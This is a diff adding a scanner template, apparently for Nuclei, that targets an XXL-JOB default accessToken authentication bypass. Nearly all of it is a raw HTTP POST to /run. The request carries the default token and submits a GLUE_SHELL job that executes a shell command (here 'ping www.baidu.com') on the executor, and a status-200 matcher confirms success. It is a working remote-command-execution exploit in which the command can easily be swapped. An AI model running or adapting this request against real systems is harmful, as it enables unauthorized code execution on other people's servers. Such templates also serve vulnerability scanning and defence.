@@ -1,0 +1,96 @@
+id: poc-qtfs5sheedb5n14c
+info:
+  name: XXL-JOB默认accessToken身份绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qtfs5sheedb5n14c'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qtfs5sheedb5n14c
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /run HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/json
+
+
+    XXL-JOB-ACCESS-TOKEN: default token
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+
+
+    {
+
+
+    "jobId": 1,
+
+
+    "executorHandler": "demoJobHandler",
+
+
+    "executorParams": "demoJobHandler",
+
+
+    "executorBlockStrategy": "SERIAL_EXECUTION",
+
+
+    "executorTimeout": 0,
+
+
+    "logId": 1,
+
+
+    "logDateTime": 1586373637819,
+
+
+    "glueType": "GLUE_SHELL",
+
+
+    "glueSource": "ping www.baidu.com",
+
+
+    "glueUpdatetime": 1586693836766,
+
+
+    "broadcastIndex": 0,
+
+
+    "broadcastTotal": 0
+
+
+    }
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?code)(?=.*?200).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
